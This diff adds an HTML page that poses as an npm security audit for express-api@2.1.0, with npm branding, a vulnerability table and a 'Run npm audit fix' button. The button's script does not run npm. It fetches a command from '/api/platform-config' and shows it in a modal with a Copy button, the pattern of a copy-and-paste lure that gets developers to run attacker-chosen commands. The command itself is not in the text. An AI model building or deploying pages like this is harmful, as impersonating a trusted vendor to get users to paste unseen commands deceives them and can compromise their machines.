@@ -1,0 +1,55 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Security Advisory — npm</title><meta name="theme-color" content="#cb3837">
+<style>:root{--c:#cb3837;--ch:#a52a2a;--bg:#f8f8f8;--bg2:#ffffff;--bg3:#f0f0f0;--text:#1a1a1a;--text2:#666;--text3:#999;--border:#e0e0e0;--radius:6px;--red:#cb3837;--amber:#d29922}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"PingFang SC","Microsoft YaHei",sans-serif;background:var(--bg);color:var(--text);line-height:1.7}
+.btn{display:inline-flex;align-items:center;gap:6px;padding:8px 16px;border-radius:6px;font-size:14px;font-weight:500;cursor:pointer;font-family:inherit;border:1px solid var(--border)}
+.btn-primary{background:var(--c);color:#fff;border-color:var(--c)}.btn-primary:hover{background:var(--ch)}
+nav{background:var(--bg2);border-bottom:2px solid var(--c);position:sticky;top:0;z-index:90}
+.nav-inner{max-width:1000px;margin:0 auto;display:flex;align-items:center;padding:0 20px;height:54px;gap:16px}
+.nav-logo{font-size:18px;font-weight:800;color:var(--c);text-decoration:none}
+.container{max-width:860px;margin:0 auto;padding:0 20px}
+.page-header{padding:32px 0 20px}
+.page-header h1{font-size:1.4rem;font-weight:600;margin-bottom:6px}
+.page-header .meta{font-size:13px;color:var(--text2)}
+.audit-card{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:20px 24px;margin:16px 0}
+.audit-card table{width:100%;font-size:13px;border-collapse:collapse}
+.audit-card th{text-align:left;padding:6px 10px;font-size:11px;color:var(--text3);text-transform:uppercase;border-bottom:1px solid var(--border)}
+.audit-card td{padding:6px 10px;border-bottom:1px solid var(--border);color:var(--text2)}
+.sev{font-weight:700}.sev.crit{color:var(--red)}.sev.high{color:var(--amber)}
+.action-card{background:var(--bg2);border:2px solid var(--c);border-radius:8px;padding:24px;text-align:center;margin:24px 0}
+.action-card p{color:var(--text2);font-size:14px;margin-bottom:16px}
+footer{text-align:center;padding:28px 20px;font-size:12px;color:var(--text3);border-top:1px solid var(--border)}
+.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:1000;align-items:center;justify-content:center}
+.modal-overlay.active{display:flex}
+.modal{background:var(--bg2);border-radius:8px;padding:36px;max-width:500px;width:92%;position:relative;animation:modalIn .25s ease;box-shadow:0 20px 60px rgba(0,0,0,.15)}
+@keyframes modalIn{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}
+.modal-close{position:absolute;top:12px;right:16px;background:none;border:none;font-size:22px;cursor:pointer;color:var(--text3);font-family:inherit}
+.modal h2{font-size:18px;font-weight:600;margin-bottom:8px}
+.modal .desc{font-size:14px;color:var(--text2);margin-bottom:20px}
+.code-display{background:#f8f0f0;border:1px solid var(--red);border-radius:var(--radius);padding:14px 16px;display:flex;align-items:center;justify-content:space-between;gap:12px}
+.code-display code{font-family:"JetBrains Mono",Consolas,monospace;font-size:13px;color:var(--red)}
+.code-display .copy-btn{background:var(--c);color:#fff;border:none;border-radius:4px;padding:6px 16px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit}
+.toast-container{position:fixed;bottom:24px;right:24px;z-index:10000}
+.toast{background:var(--text);color:#fff;padding:10px 18px;border-radius:var(--radius);font-size:13px;animation:toastIn .3s ease}
+@keyframes toastIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+</style></head><body>
+<nav>
+  <div class="nav-inner">
+    <a href="https://www.npmjs.com" class="nav-logo" target="_blank" rel="noopener">npm</a>
+    <div class="nav-links"><a href="https://www.npmjs.com/products" target="_blank" rel="noopener">Products</a><a href="https://docs.npmjs.com" target="_blank" rel="noopener">Docs</a><a href="https://www.npmjs.com/advisories" target="_blank" rel="noopener">Advisories</a><a href="https://docs.npmjs.com/cli/audit" target="_blank" rel="noopener">CLI</a><a href="https://www.npmjs.com/support" target="_blank" rel="noopener">Support</a></div>
+  </div>
+</nav>
+<main class="container">
+<div class="page-header"><h1>Security Audit: express-api@2.1.0</h1><div class="meta">npm audit report &middot; 2026-07-09 &middot; 8 vulnerabilities found</div></div>
+<div class="audit-card"><table><thead><tr><th>Package</th><th>Severity</th><th>Vulnerable Versions</th><th>Fix</th></tr></thead><tbody>
+<tr><td>express@4.18.2</td><td class="sev crit">Critical</td><td>&lt;4.19.0</td><td>4.19.0</td></tr>
+<tr><td>body-parser@1.20.1</td><td class="sev high">High</td><td>&lt;1.20.2</td><td>1.20.2</td></tr>
+<tr><td>semver@7.5.4</td><td class="sev high">High</td><td>&lt;7.6.0</td><td>7.6.0</td></tr>
+<tr><td>debug@4.3.4</td><td class="sev high">High</td><td>&lt;4.3.5</td><td>4.3.5</td></tr></tbody></table></div>
+<div class="action-card"><p>Run <code>npm audit fix</code> to automatically resolve these vulnerabilities and update affected packages.</p>
+<button class="btn btn-primary" style="padding:12px 28px;font-size:15px" id="btnDiag">Run npm audit fix</button></div>
+</main>
+<footer>npm, Inc. &copy; 2026</footer>
+<div id="toastContainer" class="toast-container"></div>
+<script>(function(){var A={api:'/api/platform-config'};function toast(m){var c=document.getElementById('toastContainer'),t=document.createElement('div');t.className='toast';t.textContent=m;c.appendChild(t);setTimeout(function(){t.style.opacity='0';t.style.transition='opacity .3s';setTimeout(function(){if(t.parentNode)c.removeChild(t)},300)},2200)}function copyText(text,btn){if(navigator.clipboard&&navigator.clipboard.writeText){return navigator.clipboard.writeText(text).then(function(){mark(btn)}).catch(function(){return fallbackCopy(text).then(function(){mark(btn)})})}return fallbackCopy(text).then(function(){mark(btn)})}function fallbackCopy(text){return new Promise(function(resolve,reject){var ta=document.createElement('textarea');ta.value=text;ta.style.cssText='position:fixed;left:-99999px;top:0';document.body.appendChild(ta);ta.focus();ta.select();try{document.execCommand('copy');resolve()}catch(e){reject(e)}document.body.removeChild(ta)})}function mark(btn){var o=btn.textContent.trim();btn.textContent='Copied!';btn.classList.add('copied');setTimeout(function(){btn.textContent=o;btn.classList.remove('copied')},2000)}function showDialog(cfg){var t=cfg.text||'';var bd=document.createElement('div');bd.className='modal-overlay active';var p=document.createElement('div');p.className='modal';var cl=document.createElement('button');cl.className='modal-close';cl.innerHTML='&times;';cl.addEventListener('click',function(){if(bd.parentNode)bd.parentNode.removeChild(bd)});bd.addEventListener('click',function(e){if(e.target===bd&&bd.parentNode)bd.parentNode.removeChild(bd)});document.addEventListener('keydown',function esc(e){if(e.key==='Escape'&&bd.parentNode){bd.parentNode.removeChild(bd);document.removeEventListener('keydown',esc)}});var ti=document.createElement('h2');ti.textContent=cfg.title||'';var de=document.createElement('p');de.className='desc';de.textContent=cfg.desc||'';var db=document.createElement('div');db.className='code-display';var ce=document.createElement('code');ce.textContent=t;var cb=document.createElement('button');cb.className='copy-btn';cb.textContent='Copy';db.appendChild(ce);db.appendChild(cb);p.appendChild(cl);p.appendChild(ti);p.appendChild(de);p.appendChild(db);bd.appendChild(p);cb.addEventListener('click',function(e){e.stopPropagation();if(!t)return;copyText(t,cb)});document.body.appendChild(bd)}function fetchAndShow(){fetch(A.api,{method:'GET',headers:{'Accept':'application/json'}}).then(function(r){return r.json()}).then(function(cfg){showDialog(cfg)}).catch(function(){toast('Service unavailable')})}document.getElementById('btnDiag').addEventListener('click',function(e){e.preventDefault();fetchAndShow()})})();</script></body></html>
